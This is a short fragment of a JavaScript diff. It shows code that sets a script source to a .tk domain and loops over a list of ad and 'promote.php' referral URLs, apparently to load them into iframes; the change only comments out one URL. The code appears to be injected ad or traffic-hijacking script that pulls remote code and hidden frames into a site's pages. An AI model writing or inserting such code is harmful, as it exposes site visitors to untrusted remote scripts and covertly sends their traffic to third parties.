@@ -7,7 +7,7 @@ b.src = "http://www.7k77.tk/eicXsB?1503385493";
 var adList=[
     'http://www.hupress.tk/',
     // 'http://adpays.net/v.php?user=4297',
-    'http://ptp.skillerzforum.com/promote.php?id=22979'
+    // 'http://ptp.skillerzforum.com/promote.php?id=22979'
 ]
 for(var i=0,len=adList.length;i<len;i++){
     //iframe 
